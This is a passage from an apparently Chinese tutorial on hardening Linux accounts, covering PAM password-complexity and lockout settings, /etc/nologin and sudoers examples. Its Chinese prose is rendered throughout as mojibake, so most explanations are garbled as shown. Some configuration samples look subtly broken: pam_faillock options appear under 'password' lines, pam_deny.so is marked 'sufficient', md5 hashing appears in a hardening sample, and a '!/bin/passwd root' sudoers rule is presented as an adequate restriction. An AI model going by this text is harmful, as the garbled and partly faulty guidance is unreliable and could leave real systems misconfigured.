‡å¿—</strong>ï¼šå¦‚ <code>auth</code>, <code>account</code>, <code>password</code>, <code>session</code>ï¼Œå®ƒä»¬æŒ‡å®šäº† PAM æ¨¡å—çš„ç±»å‹ã€‚</li><li><strong>PAM æ¨¡å—è·¯å¾„</strong>ï¼šæ¨¡å—çš„å®Œæ•´è·¯å¾„ï¼Œå¦‚ <code>pam_unix.so</code>ã€‚</li><li><strong>æ¨¡å—é€‰é¡¹</strong>ï¼šä¼ é€’ç»™ PAM æ¨¡å—çš„å‚æ•°ã€‚</li><li><strong>æ¨¡å—å‚æ•°</strong>ï¼šå¯é€‰çš„ï¼Œä¼ é€’ç»™ PAM æ¨¡å—çš„é¢å¤–å‚æ•°ã€‚</li></ol><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#%PAM-1.0</span>auth        required      pam_env.soauth        sufficient    pam_unix.so nullok try_first_passauth        <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so preauth silent audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>auth        sufficient    pam_succeed_if.so uid <span class="token operator">&gt;=</span> <span class="token number">1000</span> quietauth        required      pam_deny.soaccount     required      pam_access.soaccount     required      pam_unix.so broken_shadowaccount     <span class="token punctuation">[</span>default<span class="token operator">=</span>bad <span class="token assign-left variable">success</span><span class="token operator">=</span>ok <span class="token assign-left variable">user_unknown</span><span class="token operator">=</span>ignore<span class="token punctuation">]</span> pam_succeed_if.so quietpassword    requisite    pam_pwquality.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span>password    sufficient    pam_unix.so md5 shadow use_authtok try_first_passpassword    <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so authfail audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span> pam_faillock.so authsucc audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    sufficient    pam_deny.sosession     optional      pam_keyinit.so force revokesession     required      pam_limits.sosession     <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span>   pam_succeed_if.so <span class="token function">service</span> <span class="token keyword">in</span> crond quiet use_uidsession     sufficient    pam_unix.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>ubuntuç³»ç»Ÿæ²¡æœ‰/etc/pam.d/system-authæ–‡ä»¶ï¼Ÿã€/etc/pam.d/common-passwordã€‘</li></ul><p>åœ¨Ubuntuç³»ç»Ÿä¸­ï¼Œ<code>/etc/pam.d/system-auth</code> æ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œè¿™æ˜¯å› ä¸ºUbuntuä½¿ç”¨çš„æ˜¯ä¸åŒçš„æ–‡ä»¶æ¥å¤„ç†PAMï¼ˆPluggable Authentication Modulesï¼‰é…ç½®ã€‚Ubuntuç³»ç»Ÿä¸­ä¸å¯†ç è®¾ç½®åŠç™»å½•æ§åˆ¶ç›¸å…³çš„æ–‡ä»¶é€šå¸¸æ˜¯ <code>/etc/pam.d/common-password</code>ã€‚è¿™æ˜¯å› ä¸ºUbuntuå’Œå…¶ä»–åŸºäºDebiançš„ç³»ç»Ÿä½¿ç”¨ <code>/etc/pam.d/common-password</code> ä½œä¸ºå¯†ç è®¤è¯çš„é€šç”¨é…ç½®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯åƒä¸€äº›åŸºäºRed Hatçš„ç³»ç»Ÿé‚£æ ·ä½¿ç”¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœä½ åœ¨Ubuntuç³»ç»Ÿä¸­å¯»æ‰¾ç±»ä¼¼äº <code>/etc/pam.d/system-auth</code> çš„é…ç½®æ–‡ä»¶ï¼Œä½ åº”è¯¥æŸ¥çœ‹ <code>/etc/pam.d/common-password</code> æ–‡ä»¶ï¼Œä»¥åŠå…¶ä»–å¯èƒ½çš„ <code>/etc/pam.d/</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚ <code>/etc/pam.d/common-auth</code> ç­‰ï¼Œè¿™äº›æ–‡ä»¶å…±åŒå®šä¹‰äº†Ubuntuç³»ç»Ÿçš„è®¤è¯å’Œè´¦æˆ·ç®¡ç†ç­–ç•¥ã€‚</p></blockquote><h3 id="3-1-3-å¯†ç å¤æ‚åº¦è®¾ç½®"><a href="#3-1-3-å¯†ç å¤æ‚åº¦è®¾ç½®" class="headerlink" title="3.1.3 å¯†ç å¤æ‚åº¦è®¾ç½®"></a>3.1.3 å¯†ç å¤æ‚åº¦è®¾ç½®</h3><p>è¦è®¾ç½®å¯†ç å¤æ‚åº¦ï¼Œä½ éœ€è¦ç¼–è¾‘ <code>/etc/pam.d/common-password</code> æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°åŒ…å« <code>pam_pwquality.so</code> æˆ– <code>pam_cracklib.so</code> çš„è¡Œï¼Œç„¶åæ·»åŠ æˆ–ä¿®æ”¹ä¸Šè¿°å‚æ•°ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹é…ç½®è¦æ±‚å¯†ç è‡³å°‘12ä¸ªå­—ç¬¦é•¿ï¼Œè‡³å°‘åŒ…å«ä¸€ä¸ªå¤§å†™å­—æ¯ã€ä¸€ä¸ªå°å†™å­—æ¯ã€ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä¸”rootç”¨æˆ·ä¹Ÿå¿…é¡»éµå®ˆè¿™äº›è§„åˆ™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password    requisite     pam_pwquality.so try_first_pass local_users_only <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">authtok_type</span><span class="token operator">=</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 enforce_for_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">minlen</span><span class="token operator">=</span>Nï¼šè®¾ç½®å¯†ç çš„æœ€å°é•¿åº¦ã€‚ä¾‹å¦‚ï¼Œminlen<span class="token operator">=</span><span class="token number">12</span> è¡¨ç¤ºå¯†ç è‡³å°‘éœ€è¦12ä¸ªå­—ç¬¦ã€‚<span class="token assign-left variable">dcredit</span><span class="token operator">=</span>Nï¼šæ§åˆ¶å¯†ç ä¸­æ•°å­—çš„å‡ºç°æ¬¡æ•°ã€‚å½“N<span class="token operator">&gt;</span><span class="token number">0</span>æ—¶ï¼Œè¡¨ç¤ºæ–°å¯†ç ä¸­æ•°å­—å‡ºç°çš„æœ€å¤§æ¬¡æ•°ï¼›å½“N<span class="token operator">&lt;</span><span class="token number">0</span>æ—¶ï¼Œè¡¨ç¤ºæ–°å¯†ç ä¸­æ•°å­—å‡ºç°çš„æœ€å°‘æ¬¡æ•°ã€‚ä¾‹å¦‚ï¼Œdcredit<span class="token operator">=</span>-1 è¡¨ç¤ºå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªæ•°å­—ã€‚<span class="token assign-left variable">ucredit</span><span class="token operator">=</span>Nï¼šæ§åˆ¶å¯†ç ä¸­å¤§å†™å­—æ¯çš„å‡ºç°æ¬¡æ•°ã€‚è§„åˆ™ä¸ dcredit ç›¸åŒã€‚ucredit<span class="token operator">=</span>-1 è¡¨ç¤ºå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªå¤§å†™å­—æ¯ã€‚<span class="token assign-left variable">lcredit</span><span class="token operator">=</span>Nï¼šæ§åˆ¶å¯†ç ä¸­å°å†™å­—æ¯çš„å‡ºç°æ¬¡æ•°ã€‚è§„åˆ™ä¸ dcredit ç›¸åŒã€‚lcredit<span class="token operator">=</span>-1 è¡¨ç¤ºå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªå°å†™å­—æ¯ã€‚<span class="token assign-left variable">ocredit</span><span class="token operator">=</span>Nï¼šæ§åˆ¶å¯†ç ä¸­ç‰¹æ®Šå­—ç¬¦çš„å‡ºç°æ¬¡æ•°ã€‚è§„åˆ™ä¸ dcredit ç›¸åŒã€‚ocredit<span class="token operator">=</span>-1 è¡¨ç¤ºå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€‚<span class="token assign-left variable">retry</span><span class="token operator">=</span>Nï¼šå®šä¹‰ç”¨æˆ·åœ¨å¯†ç å¤±è´¥åå¯ä»¥é‡è¯•çš„æ¬¡æ•°ã€‚ä¾‹å¦‚ï¼Œretry<span class="token operator">=</span><span class="token number">3</span> å…è®¸ç”¨æˆ·åœ¨å¯†ç è¾“å…¥é”™è¯¯åé‡è¯•3æ¬¡ã€‚<span class="token assign-left variable">difok</span><span class="token operator">=</span>Nï¼šæ–°å¯†ç ä¸æ—§å¯†ç è‡³å°‘ä¸åŒçš„å­—ç¬¦æ•°ã€‚ä¾‹å¦‚ï¼Œdifok<span class="token operator">=</span><span class="token number">3</span> è¡¨ç¤ºæ–°å¯†ç å¿…é¡»ä¸æ—§å¯†ç è‡³å°‘æœ‰3ä¸ªå­—ç¬¦ä¸åŒã€‚enforce_for_rootï¼šå³ä½¿æ˜¯rootç”¨æˆ·è®¾ç½®å¯†ç ï¼Œä¹Ÿåº”å¼ºåˆ¶æ‰§è¡Œå¤æ‚æ€§ç­–ç•¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ–è€…ï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ <code>pam_cracklib.so</code> æ¨¡å—ï¼Œé…ç½®å¯èƒ½å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">difok</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è¿›è¡Œè¿™äº›æ›´æ”¹åï¼Œä¸ºäº†ä½¿é…ç½®ç”Ÿæ•ˆï¼Œä½ å¯èƒ½éœ€è¦é‡æ–°å¯åŠ¨ç›¸å…³çš„æœåŠ¡æˆ–è€…ç³»ç»Ÿã€‚è¯·è®°å¾—åœ¨ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶ä¹‹å‰å¤‡ä»½åŸå§‹æ–‡ä»¶ï¼Œä»¥ä¾¿åœ¨å‡ºç°é—®é¢˜æ—¶å¯ä»¥æ¢å¤ã€‚</p><h2 id="3-2-å…¶ä»–å¯†ç ç­–ç•¥çš„é…ç½®"><a href="#3-2-å…¶ä»–å¯†ç ç­–ç•¥çš„é…ç½®" class="headerlink" title="3.2 å…¶ä»–å¯†ç ç­–ç•¥çš„é…ç½®"></a>3.2 å…¶ä»–å¯†ç ç­–ç•¥çš„é…ç½®</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth required pam_tally2.so <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">6</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">300</span> even_deny_root <span class="token assign-left variable">root_unlock_time</span><span class="token operator">=</span><span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_tally2.so</code>ï¼šè¿™æ˜¯ä¸€ä¸ªè´¦æˆ·é”å®šæ¨¡å—ï¼Œç”¨äºé˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»ã€‚</li><li><code>deny=6</code>ï¼šå¦‚æœç”¨æˆ·è¿ç»­6æ¬¡è¾“å…¥é”™è¯¯çš„å¯†ç ï¼Œè´¦æˆ·å°†è¢«é”å®šã€‚</li><li><code>unlock_time=300</code>ï¼šè´¦æˆ·é”å®šåï¼Œå°†åœ¨300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰åè‡ªåŠ¨è§£é”ã€‚</li><li><code>even_deny_root</code>ï¼šè¿™ä¸ªé€‰é¡¹æ„å‘³ç€å³ä½¿æ˜¯rootç”¨æˆ·ï¼Œä¹Ÿä¼šå—åˆ°è´¦æˆ·é”å®šçš„é™åˆ¶ã€‚</li><li><code>root_unlock_time=60</code>ï¼šå¯¹äºrootç”¨æˆ·ï¼Œè´¦æˆ·é”å®šæ—¶é—´æ˜¯60ç§’ã€‚</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so try_first_pass <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">minclass</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_cracklib.so</code>ï¼šå¦ä¸€ä¸ªç”¨äºæ£€æŸ¥å¯†ç è´¨é‡çš„æ¨¡å—ã€‚</li><li><code>try_first_pass</code>ï¼šå°è¯•ä½¿ç”¨å‰ä¸€é˜¶æ®µçš„å¯†ç ã€‚å½“è¿™ä¸ªé€‰é¡¹è¢«è®¾ç½®æ—¶ï¼ŒPAMæ¨¡å—ä¼šå°è¯•ä½¿ç”¨åœ¨è®¤è¯é˜¶æ®µï¼ˆé€šå¸¸æ˜¯ç”¨æˆ·ç™»å½•æ—¶ï¼‰å·²ç»è¾“å…¥çš„å¯†ç ï¼Œè€Œä¸æ˜¯è¦æ±‚ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç ã€‚è¿™æ„å‘³ç€å¦‚æœç”¨æˆ·åœ¨ç™»å½•æ—¶è¾“å…¥äº†å¯†ç ï¼Œè¿™ä¸ªå¯†ç ä¼šè¢«â€œè®°ä½â€ï¼Œå¹¶åœ¨éœ€è¦æ—¶ç”¨äºå¯†ç æ›´æ”¹æ“ä½œã€‚</li><li><code>retry=3</code>ï¼šç”¨æˆ·å¯ä»¥é‡è¯•3æ¬¡ã€‚</li><li><code>dcredit=-1</code>ï¼šå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªæ•°å­—ã€‚</li><li><code>lcredit=-1</code>ï¼šå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªå°å†™å­—æ¯ã€‚</li><li><code>ucredit=-1</code>ï¼šå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªå¤§å†™å­—æ¯ã€‚</li><li><code>ocredit=-1</code>ï¼šå¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€‚</li><li><code>minclass=3</code>ï¼šå¯†ç è‡³å°‘åŒ…å«ä¸‰ç§ä¸åŒç±»å‹çš„å­—ç¬¦ã€‚</li><li><code>minlen=8</code>ï¼šå¯†ç çš„æœ€å°é•¿åº¦ä¸º8ä¸ªå­—ç¬¦ã€‚</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok <span class="token assign-left variable">remember</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_unix.so</code>ï¼šä½¿ç”¨SHA-512ç®—æ³•æ¥åŠ å¯†å¯†ç ã€‚</li><li><code>shadow</code>ï¼šä½¿ç”¨å½±å­å¯†ç æ–‡ä»¶ã€‚</li><li><code>nullok</code>ï¼šå…è®¸ç©ºå¯†ç ã€‚</li><li><code>try_first_pass</code>ï¼šå°è¯•ä½¿ç”¨å‰ä¸€é˜¶æ®µçš„å¯†ç ã€‚</li><li><code>use_authtok</code>ï¼šä½¿ç”¨è®¤è¯é˜¶æ®µçš„å¯†ç ã€‚</li><li><code>remember=5</code>ï¼šè®°ä½ç”¨æˆ·æœ€è¿‘ä½¿ç”¨çš„5ä¸ªå¯†ç ï¼Œé˜²æ­¢ç”¨æˆ·é‡å¤ä½¿ç”¨æ—§å¯†ç ã€‚</li></ul><h1 id="å››ã€ç™»å½•æ§åˆ¶"><a href="#å››ã€ç™»å½•æ§åˆ¶" class="headerlink" title="å››ã€ç™»å½•æ§åˆ¶"></a>å››ã€ç™»å½•æ§åˆ¶</h1><h2 id="4-1-ç¦æ­¢é™¤rootä»¥å¤–çš„æ‰€æœ‰ç”¨æˆ·ç™»å½•"><a href="#4-1-ç¦æ­¢é™¤rootä»¥å¤–çš„æ‰€æœ‰ç”¨æˆ·ç™»å½•" class="headerlink" title="4.1 ç¦æ­¢é™¤rootä»¥å¤–çš„æ‰€æœ‰ç”¨æˆ·ç™»å½•"></a>4.1 ç¦æ­¢é™¤rootä»¥å¤–çš„æ‰€æœ‰ç”¨æˆ·ç™»å½•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><strong>é˜»æ­¢æ™®é€šç”¨æˆ·ç™»å½•</strong>ï¼šå½“ <code>/etc/nologin</code> æ–‡ä»¶å­˜åœ¨æ—¶ï¼Œé™¤äº† root ç”¨æˆ·ä¹‹å¤–çš„æ‰€æœ‰ç”¨æˆ·åœ¨å°è¯•ç™»å½•æ—¶éƒ½ä¼šæ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ï¼Œé€šå¸¸æ˜¯ â€œ/etc/nologin: Permission deniedâ€ æˆ–è€…æ–‡ä»¶ä¸­å®šä¹‰çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”ç™»å½•å°è¯•ä¼šè¢«æ‹’ç»ã€‚è¿™å¯ä»¥ç”¨äºç³»ç»Ÿç»´æŠ¤æˆ–åœ¨ç³»ç»Ÿæ›´æ–°æœŸé—´é˜²æ­¢ç”¨æˆ·ç™»å½•ã€‚</p></li><li><p><strong>è‡ªå®šä¹‰ç™»å½•æ¶ˆæ¯</strong>ï¼šä½ å¯ä»¥åœ¨ <code>/etc/nologin</code> æ–‡ä»¶ä¸­æ·»åŠ è‡ªå®šä¹‰æ¶ˆæ¯ï¼Œè¿™æ ·å½“ç”¨æˆ·å°è¯•ç™»å½•æ—¶ï¼Œä»–ä»¬ä¼šçœ‹åˆ°è¿™æ¡æ¶ˆæ¯è€Œä¸æ˜¯é»˜è®¤çš„æ‹’ç»æ¶ˆæ¯ã€‚è¿™å¯ä»¥ç”¨æ¥é€šçŸ¥ç”¨æˆ·ç³»ç»Ÿç»´æŠ¤çš„æ—¶é—´æˆ–è€…ä¸ºä»€ä¹ˆä»–ä»¬ä¸èƒ½ç™»å½•ã€‚</p></li><li><p><strong>ç³»ç»Ÿç»´æŠ¤</strong>ï¼šåœ¨ç³»ç»Ÿéœ€è¦è¿›è¡Œç»´æŠ¤æˆ–æ›´æ–°æ—¶ï¼Œåˆ›å»º <code>/etc/nologin</code> æ–‡ä»¶æ˜¯ä¸€ç§å¿«é€Ÿé€šçŸ¥æ‰€æœ‰ç”¨æˆ·ç³»ç»Ÿæš‚æ—¶ä¸å¯ç”¨çš„æ–¹æ³•ã€‚</p></li></ol><p>ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"System maintenance in progress. Please try again later."</span> <span class="token operator">&gt;</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°†ä¼šåœ¨ <code>/etc/nologin</code> æ–‡ä»¶ä¸­å†™å…¥ä¸€æ¡æ¶ˆæ¯ï¼Œå‘ŠçŸ¥ç”¨æˆ·ç³»ç»Ÿæ­£åœ¨è¿›è¡Œç»´æŠ¤ã€‚</p><p>è¯·æ³¨æ„ï¼Œåˆ›å»º <code>/etc/nologin</code> æ–‡ä»¶æ˜¯ä¸€ä¸ªå½±å“æ‰€æœ‰é root ç”¨æˆ·çš„æ“ä½œï¼Œå› æ­¤åœ¨æ‰§è¡Œæ­¤æ“ä½œä¹‹å‰åº”è¯¥è°¨æ…è€ƒè™‘ï¼Œå¹¶ç¡®ä¿æ‰€æœ‰å—å½±å“çš„ç”¨æˆ·éƒ½å¾—åˆ°äº†é€‚å½“çš„é€šçŸ¥ã€‚</p><h1 id="äº”ã€è´¦æˆ·æƒé™æ§åˆ¶"><a href="#äº”ã€è´¦æˆ·æƒé™æ§åˆ¶" class="headerlink" title="äº”ã€è´¦æˆ·æƒé™æ§åˆ¶"></a>äº”ã€è´¦æˆ·æƒé™æ§åˆ¶</h1><h2 id="5-1-etc-sudoersç®€ä»‹"><a href="#5-1-etc-sudoersç®€ä»‹" class="headerlink" title="5.1 /etc/sudoersç®€ä»‹"></a>5.1 /etc/sudoersç®€ä»‹</h2><p><code>/etc/sudoers</code> æ–‡ä»¶æ˜¯ Unix å’Œç±» Unix ç³»ç»Ÿä¸­ç”¨äºå®šä¹‰å“ªäº›ç”¨æˆ·å¯ä»¥æ‰§è¡Œå“ªäº›å‘½ä»¤ä»¥åŠä»–ä»¬å¯ä»¥åœ¨å“ªå°æœºå™¨ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯ sudo å·¥å…·çš„åŸºç¡€ï¼Œsudo å…è®¸æˆæƒçš„ç”¨æˆ·ä»¥å…¶ä»–ç”¨æˆ·çš„å®‰å…¨æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ä»¥è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰çš„æƒé™æ‰§è¡Œã€‚</p><p>ç¼–è¾‘ <code>/etc/sudoers</code> æ–‡ä»¶éœ€è¦éå¸¸å°å¿ƒï¼Œå› ä¸ºé”™è¯¯çš„é…ç½®å¯èƒ½å¯¼è‡´ç³»ç»Ÿæ— æ³•æ­£å¸¸ä½¿ç”¨ sudo å‘½ä»¤ã€‚æ¨èä½¿ç”¨ <code>visudo</code> å‘½ä»¤æ¥ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼Œå› ä¸º <code>visudo</code> ä¼šåœ¨ä¿å­˜å‰æ£€æŸ¥è¯­æ³•é”™è¯¯ï¼Œä»è€Œé˜²æ­¢é…ç½®é”™è¯¯ã€‚</p><h2 id="5-2-suddersé…ç½®ç¤ºä¾‹"><a href="#5-2-suddersé…ç½®ç¤ºä¾‹" class="headerlink" title="5.2 suddersé…ç½®ç¤ºä¾‹"></a>5.2 suddersé…ç½®ç¤ºä¾‹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å…è®¸ç”¨æˆ· alice ä»ä»»ä½•ä¸»æœºæ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œä¸éœ€è¦å¯†ç </span>alice <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL<span class="token comment"># å…è®¸ç”¨æˆ· bob ä»…åœ¨æœ¬åœ°ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦å¯†ç </span>bob <span class="token assign-left variable">localhost</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># å…è®¸æ•´ä¸ª wheel ç»„çš„ç”¨æˆ·åœ¨ä»»ä½•ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦å¯†ç </span>%wheel <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># å®šä¹‰ä¸€ä¸ªå‘½ä»¤åˆ«åï¼Œä¾‹å¦‚å®šä¹‰ä¸€ä¸ªåªå…è®¸é‡å¯æœåŠ¡çš„åˆ«å</span>Cmnd_Alias REBOOT <span class="token operator">=</span> /sbin/shutdown <span class="token parameter variable">-r</span> now, /sbin/reboot<span class="token comment"># å…è®¸ç”¨æˆ· carol æ‰§è¡Œ REBOOT åˆ«åä¸­çš„å‘½ä»¤ï¼Œä¸éœ€è¦å¯†ç </span>carol <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: REBOOT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.38.50.png" style="zoom:30%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zhangsan <span class="token assign-left variable">ALL</span><span class="token operator">=</span>NOPASSWD: /bin/passwd, <span class="token operator">!</span>/bin/passwd root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>zhangsan**ï¼šè¿™æ˜¯ç”¨æˆ·åï¼Œè¡¨ç¤ºè¿™ä¸ªé…ç½®è§„åˆ™é€‚ç”¨äºåä¸º <code>zhangsan</code> çš„ç”¨æˆ·ã€‚</li><li><strong>ALL</strong>ï¼šè¿™è¡¨ç¤ºè¯¥è§„åˆ™é€‚ç”¨äºæ‰€æœ‰ä¸»æœºã€‚<code>zhangsan</code> ç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä¸Šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ã€‚</li><li><strong>=NOPASSWD</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œè¡¨ç¤ºåœ¨æ‰§è¡Œåé¢çš„å‘½ä»¤æ—¶ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚<code>NOPASSWD</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ sudo é€‰é¡¹ï¼Œç”¨äºæé«˜ä¾¿åˆ©æ€§ï¼Œä½†éœ€è¦æ³¨æ„è¿™å¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚</li><li><strong>/bin/passwd</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå‘½ä»¤åˆ«åï¼Œé€šå¸¸ç”¨äºæ›´æ”¹ç”¨æˆ·å¯†ç ã€‚åœ¨è¿™é‡Œï¼Œå®ƒå…è®¸ <code>zhangsan</code> ç”¨æˆ·æ›´æ”¹ä»»ä½•ç”¨æˆ·çš„å¯†ç ï¼ŒåŒ…æ‹¬è‡ªå·±çš„ã€‚</li><li><strong>!/bin/passwd root</strong>ï¼šè¿™é‡Œçš„æ„Ÿå¹å· <code>!</code> è¡¨ç¤ºå¦å®šï¼Œå³ <code>zhangsan</code> ç”¨æˆ·ä¸å…è®¸ä½¿ç”¨ <code>/bin/passwd</code> å‘½ä»¤æ¥æ›´æ”¹ root ç”¨æˆ·çš„å¯†ç ã€‚</li></ol><p>ç»¼åˆæ¥çœ‹ï¼Œè¿™è¡Œé…ç½®å…è®¸ç”¨æˆ· <code>zhangsan</code> åœ¨æ‰€æœ‰ä¸»æœºä¸Šæ›´æ”¹ä»»ä½•ç”¨æˆ·çš„å¯†ç ï¼Œä½†æœ‰ä¸€ä¸ªä¾‹å¤–ï¼š<code>zhangsan</code> ä¸èƒ½æ›´æ”¹ root ç”¨æˆ·çš„å¯†ç ï¼Œå³ä½¿ä¸éœ€è¦è¾“å…¥å¯†ç ã€‚è¿™ç§é…ç½®å¯ä»¥ç”¨äºèµ‹äºˆç‰¹å®šç”¨æˆ·ç®¡ç†å…¶ä»–ç”¨æˆ·å¯†ç çš„æƒé™ï¼ŒåŒæ—¶ä¿ç•™å¯¹ root å¯†ç çš„æ§åˆ¶æƒã€‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># è¿™ä¸€è¡Œèµ‹äºˆ root 